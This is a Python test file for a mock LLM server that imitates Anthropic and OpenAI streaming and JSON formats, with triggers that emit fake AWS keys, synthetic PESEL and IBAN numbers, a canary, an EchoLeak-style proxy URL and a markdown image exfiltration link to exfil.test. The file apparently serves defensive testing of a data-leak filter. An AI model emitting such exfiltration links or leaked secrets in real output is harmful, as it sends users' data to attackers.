"""DEMO-V02: mock_llm wire shapes, triggers, usage, request log, scan (in-process ASGI)."""

from __future__ import annotations

import json
import math
import re

from mocks.mock_llm import fakegen
from mocks.mock_llm.script import CANARY, ECHO_PREFIX

AKIA = re.compile(r"AKIA[A-Z2-7]{16}")


def parse_anthropic_sse(text: str) -> list[tuple[str, dict]]:
    out = []
    for block in text.strip().split("\n\n"):
        lines = block.splitlines()
        ev = next(line[7:] for line in lines if line.startswith("event: "))
        data = json.loads(next(line[6:] for line in lines if line.startswith("data: ")))
        out.append((ev, data))
    return out


def parse_openai_sse(text: str) -> list:
    out = []
    for block in text.strip().split("\n\n"):
        payload = block[len("data: ") :]
        out.append(payload if payload == "[DONE]" else json.loads(payload))
    return out


def amsg(text: str, model: str = "mock-echo", **kw) -> dict:
    return {"model": model, "max_tokens": 512, "messages": [{"role": "user", "content": text}], **kw}


def omsg(text: str, model: str = "mock-echo", **kw) -> dict:
    return {"model": model, "messages": [{"role": "user", "content": text}], **kw}


async def test_anthropic_json_echo_and_usage(llm):
    body = amsg("Client [PESEL_1] and [IBAN_1]")
    r = await llm.post("/v1/messages", json=body)
    assert r.status_code == 200
    d = r.json()
    assert d["type"] == "message" and d["id"].startswith("msg_mock_")
    text = d["content"][0]["text"]
    assert text == ECHO_PREFIX + "Client [PESEL_1] and [IBAN_1]"
    assert d["usage"]["output_tokens"] == math.ceil(len(text) / 4)
    assert d["usage"]["input_tokens"] == math.ceil(len("Client [PESEL_1] and [IBAN_1]") / 4)
    assert d["stop_reason"] == "end_turn"


async def test_anthropic_sse_shape_and_secret_split(llm):
    r = await llm.post("/v1/messages", json=amsg("hi [[EMIT_SECRET]]", stream=True))
    assert r.headers["content-type"].startswith("text/event-stream")
    events = parse_anthropic_sse(r.text)
    names = [e for e, _ in events]
    assert names[:2] == ["message_start", "ping"]
    assert names[-2:] == ["message_delta", "message_stop"]
    idx = [d["index"] for e, d in events if e.startswith("content_block")]
    assert sorted(set(idx)) == list(range(len(set(idx))))  # contiguous from 0
    deltas = [d["delta"]["text"] for e, d in events if e == "content_block_delta"]
    full = "".join(deltas)
    keys = AKIA.findall(full)
    assert len(keys) == 1 and keys[0] != fakegen.AWS_DOCS_EXAMPLE
    assert not any(AKIA.search(p) for p in deltas)  # never whole in one delta
    spans = [i for i in range(len(deltas) - 2) if "".join(deltas[i : i + 3]) == keys[0]]
    assert spans, "key must span exactly 3 consecutive deltas"


async def test_openai_json_and_stream_usage_only_when_requested(llm):
    r = await llm.post("/v1/chat/completions", json=omsg("hello"))
    d = r.json()
    assert d["object"] == "chat.completion" and d["id"].startswith("chatcmpl-mock-")
    assert d["choices"][0]["message"]["content"] == ECHO_PREFIX + "hello"
    assert d["usage"]["completion_tokens"] == math.ceil(len(ECHO_PREFIX + "hello") / 4)

    r = await llm.post("/v1/chat/completions", json=omsg("hello", stream=True))
    chunks = parse_openai_sse(r.text)
    assert chunks[-1] == "[DONE]"
    assert not any(isinstance(c, dict) and "usage" in c for c in chunks)
    assert chunks[-2]["choices"][0]["finish_reason"] == "stop"

    r = await llm.post(
        "/v1/chat/completions",
        json=omsg("hello", stream=True, stream_options={"include_usage": True}),
    )
    chunks = parse_openai_sse(r.text)
    assert chunks[-2]["choices"] == [] and chunks[-2]["usage"]["prompt_tokens"] >= 1
    text = "".join(
        c["choices"][0]["delta"].get("content", "") for c in chunks if isinstance(c, dict) and c["choices"]
    )
    assert text == ECHO_PREFIX + "hello"


async def test_emit_pii_checksums(llm):
    r = await llm.post("/v1/messages", json=amsg("[[EMIT_PII]]"))
    text = r.json()["content"][0]["text"]
    pesel = re.search(r"PESEL (\d{11})", text).group(1)
    iban = re.search(r"IBAN (PL\d{26})", text).group(1)
    assert fakegen.pesel_ok(pesel)
    assert fakegen.iban_ok(iban)


async def test_md_exfil_canary_echoleak(llm):
    r = await llm.post("/v1/messages", json=amsg("[[EMIT_MD_EXFIL]] [[EMIT_CANARY]] [[EMIT_ECHOLEAK_PROXY]]"))
    text = r.json()["content"][0]["text"]
    assert "![x](http://exfil.test/p.png?d=" in text
    assert CANARY in text
    assert "assets.acme-capital.example/img/proxy" in text


async def test_tool_use_both_wires(llm):
    trig = '[[TOOL_USE:send_email:{"to": "client@client.example", "subject": "hi"}]]'
    d = (await llm.post("/v1/messages", json=amsg(trig))).json()
    tu = [b for b in d["content"] if b["type"] == "tool_use"]
    assert tu and tu[0]["name"] == "send_email" and tu[0]["input"]["to"] == "client@client.example"
    assert d["stop_reason"] == "tool_use"

    events = parse_anthropic_sse((await llm.post("/v1/messages", json=amsg(trig, stream=True))).text)
    raw = "".join(d["delta"]["partial_json"] for e, d in events
                  if e == "content_block_delta" and d["delta"]["type"] == "input_json_delta")
    assert json.loads(raw)["subject"] == "hi"

    d = (await llm.post("/v1/chat/completions", json=omsg(trig))).json()
    tc = d["choices"][0]["message"]["tool_calls"][0]
    assert tc["function"]["name"] == "send_email" and d["choices"][0]["finish_reason"] == "tool_calls"
    chunks = parse_openai_sse((await llm.post("/v1/chat/completions", json=omsg(trig, stream=True))).text)
    args = "".join(
        tcd.get("function", {}).get("arguments", "")
        for c in chunks if isinstance(c, dict) and c["choices"]
        for tcd in c["choices"][0]["delta"].get("tool_calls", [])
    )
    assert json.loads(args)["to"] == "client@client.example"


async def test_long_and_max_tokens(llm):
    d = (await llm.post("/v1/messages", json=amsg("[[LONG:100]]"))).json()
    out = d["usage"]["output_tokens"]
    assert 100 <= out <= 100 + 30  # filler ~100 tokens + short echo line
    d = (await llm.post("/v1/messages", json=amsg("[[LONG:20000]]", max_tokens=64))).json()
    assert d["usage"]["output_tokens"] <= 64 and d["stop_reason"] == "max_tokens"


async def test_error_trigger(llm):
    r = await llm.post("/v1/messages", json=amsg("[[ERROR:529]]"))
    assert r.status_code == 529 and r.json()["type"] == "error"
    r = await llm.post("/v1/chat/completions", json=omsg("[[ERROR:500]]"))
    assert r.status_code == 500 and "error" in r.json()


async def test_mock_sonnet_reuses_placeholders(llm):
    d = (await llm.post("/v1/messages", json=amsg("Write to [PERSON_1] about [IBAN_1]", model="mock-sonnet"))).json()
    text = d["content"][0]["text"]
    assert "Dear [PERSON_1]" in text and text.count("[IBAN_1]") >= 2


async def test_request_log_newest_first_no_auth(llm):
    await llm.post("/v1/messages", json=amsg("first"), headers={"x-api-key": "sk-should-not-log",
                                                                   "authorization": "Bearer nope"})
    await llm.post("/v1/chat/completions", json=omsg("second"))
    d = (await llm.get("/_mock/requests?limit=10")).json()
    assert d["count"] == 2
    assert d["items"][0]["wire"] == "openai" and d["items"][1]["wire"] == "anthropic"
    blob = json.dumps(d)
    assert "sk-should-not-log" not in blob and "Bearer nope" not in blob
    assert d["items"][1]["headers"]["x-api-key"] == "<redacted>"
    assert (await llm.delete("/_mock/requests")).json()["cleared"] == 2
    assert (await llm.get("/_mock/requests")).json()["items"] == []


async def test_scan_counts_raw_values(llm):
    await llm.post("/v1/messages", json=amsg("PESEL 44051401359 and [IBAN_1]"))
    d = (await llm.post("/_mock/scan", json={"values": ["44051401359", "PL61109010140000071219812874"]})).json()
    assert d["total"] == 1 and sorted(d["found"].values()) == [0, 1]


async def test_models_health_reset_count_tokens(llm):
    ids = [m["id"] for m in (await llm.get("/v1/models")).json()["data"]]
    assert ids == ["mock-echo", "mock-sonnet"]
    assert (await llm.get("/_mock/health")).json()["service"] == "mock_llm"
    ct = (await llm.post("/v1/messages/count_tokens", json=amsg("abcdefgh"))).json()
    assert ct["input_tokens"] == 2
    await llm.post("/v1/messages", json=amsg("x"))
    assert (await llm.post("/_mock/reset")).json()["ok"] is True
    assert (await llm.get("/_mock/requests")).json()["count"] == 0
